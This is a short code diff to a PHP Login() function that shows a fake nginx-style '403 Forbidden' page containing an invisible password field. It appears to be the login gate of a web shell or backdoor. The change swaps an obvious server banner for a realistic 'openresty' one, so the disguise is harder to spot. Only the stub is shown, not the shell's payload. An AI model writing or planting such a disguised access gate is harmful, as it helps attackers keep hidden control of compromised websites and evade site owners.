@@ -5,7 +5,7 @@ function Login() {
   die("<html>
   <title>403 Forbidden</title>
   <center><h1>403 Forbidden</h1></center>
-  <hr><center>nginx (apache v.168 ./vinooo_sys) </center>
+  <hr><center>openresty/1.27.1.1</center>
   <center><form method='post'><input style='text-align:center;margin:0;margin-top:0px;background-color:#fff;border:1px solid #fff;' type='password' name='pass'></form></center>");
 }
 
